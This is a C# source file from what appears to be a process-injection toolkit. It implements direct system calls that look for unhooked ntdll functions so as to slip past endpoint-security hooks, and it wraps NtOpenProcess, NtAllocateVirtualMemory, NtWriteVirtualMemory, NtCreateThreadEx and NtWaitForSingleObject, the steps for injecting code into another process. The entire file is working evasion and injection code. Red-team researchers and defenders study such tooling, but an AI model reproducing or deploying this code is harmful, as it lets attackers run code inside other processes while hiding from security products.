using ProcessInjection.Native;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using static ProcessInjection.Native.Structs;
using static ProcessInjection.Native.Enum;

namespace ProcessInjection.DirectSyscalls
{
    public static class Syscalls
    {

        static IntPtr ntdllBaseAddress = IntPtr.Zero;

        private static readonly byte[] X64DirectSyscallStub =
        {
            0x4c, 0x8b, 0xd1,               			                // mov r10, rcx
            0xb8, 0x00, 0x00, 0x00, 0x00,    	              	        // mov eax, ssn
            0x0F, 0x05,                                                 // syscall
            0xC3                                                        // ret
        };

        public static IntPtr NtDllBaseAddress
        {
            get
            {
                if (ntdllBaseAddress == IntPtr.Zero)
                    ntdllBaseAddress = GetNtdllBaseAddress();
                return ntdllBaseAddress;
            }
        }
        private static IntPtr GetNtdllBaseAddress()
        {
            Process hProc = Process.GetCurrentProcess();

            foreach (ProcessModule m in hProc.Modules)
            {
                if (m.ModuleName.ToUpper().Equals("NTDLL.DLL"))
                    return m.BaseAddress;
            }
            return IntPtr.Zero;
        }

        public static byte[] GetSysCallStub(string FunctionName)
        {
            var stub = X64DirectSyscallStub;
            var funcAddress = Win32API.GetProcAddress(NtDllBaseAddress, FunctionName);

            byte count = 0;

            // loop until we find an unhooked function
            while (true)
            {
                // is the function hooked - we are looking for the 0x4C, 0x8B, 0xD1, instructions - this is the start of a syscall
                bool hooked = false;

                var instructions = new byte[5];
                Marshal.Copy(funcAddress, instructions, 0, instructions.Length);
                if (!StructuralComparisons.StructuralEqualityComparer.Equals(new byte[3] { instructions[0], instructions[1], instructions[2] }, new byte[3] { 0x4C, 0x8B, 0xD1 }))
                    hooked = true;

                if (!hooked)
                {
                    var syscallnumber = (byte)(instructions[4] - count);
                    X64DirectSyscallStub[4] = syscallnumber;
                    return stub;
                }
                funcAddress = (IntPtr)((UInt64)funcAddress + ((UInt64)32));
                count++;
            }
        }

        public static NTSTATUS NtOpenProcess(
            ref IntPtr ProcessHandle,
            uint DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjectAttributes,
            ref CLIENT_ID processId)
        {
            // set byte array of bNtOpenProcess to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtOpenProcess");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtOpenProcess
                    Delegates.NtOpenProcess assembledFunction = (Delegates.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtOpenProcess));

                    return (NTSTATUS)assembledFunction(
                        ref ProcessHandle,
                        DesiredAccess,
                        ref ObjectAttributes,
                        ref processId);
                }
            }
        }

        public static NTSTATUS NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref IntPtr RegionSize,
            uint AllocationType,
            uint Protect)
        {
            // set byte array of bNtAllocateVirtualMemory to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtAllocateVirtualMemory");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtAllocateVirtualMemory
                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

                    return (NTSTATUS)assembledFunction(
                        ProcessHandle,
                        ref BaseAddress,
                        ZeroBits,
                        ref RegionSize,
                        AllocationType,
                        Protect);
                }
            }
        }

        public static NTSTATUS NtWriteVirtualMemory(
            IntPtr processHandle,
            IntPtr baseAddress,
            byte[] buffer,
            uint bufferLength,
            ref uint bytesWritten)
        {
            // set byte array of bNtWriteVirtualMemory to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtWriteVirtualMemory");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtWriteVirtualMemory
                    Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));

                    return (NTSTATUS)assembledFunction(
                        processHandle,
                        baseAddress,
                        buffer,
                        bufferLength,
                        ref bytesWritten);
                }
            }
        }

        public static NTSTATUS NtCreateThreadEx(
            out IntPtr hThread,
            ACCESS_MASK DesiredAccess,
            IntPtr ObjectAttributes,
            IntPtr ProcessHandle,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            bool CreateSuspended,
            uint StackZeroBits,
            uint SizeOfStackCommit,
            uint SizeOfStackReserve,
            IntPtr lpBytesBuffer
            )
        {
            // set byte array of bNtCreateThread to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtCreateThreadEx");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtCreateThread
                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));

                    return (NTSTATUS)assembledFunction(
                        out hThread,
                        DesiredAccess,
                        ObjectAttributes,
                        ProcessHandle,
                        lpStartAddress,
                        lpParameter,
                        CreateSuspended,
                        StackZeroBits,
                        SizeOfStackCommit,
                        SizeOfStackReserve,
                        lpBytesBuffer
                        );
                }
            }
        }

        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)
        {
            // set byte array of bNtWaitForSingleObject to new byte array called syscall
            byte[] syscall = GetSysCallStub("NtWaitForSingleObject");

            // specify unsafe context
            unsafe
            {
                // create new byte pointer and set value to our syscall byte array
                fixed (byte* ptr = syscall)
                {
                    // cast the byte array pointer into a C# IntPtr called memoryAddress
                    IntPtr memoryAddress = (IntPtr)ptr;

                    // Change memory access to RX for our assembly code
                    if (!Win32API.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)MemProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))
                    {
                        throw new Win32Exception();
                    }

                    // Get delegate for NtWaitForSingleObject
                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));

                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);
                }
            }
        }

    }
}
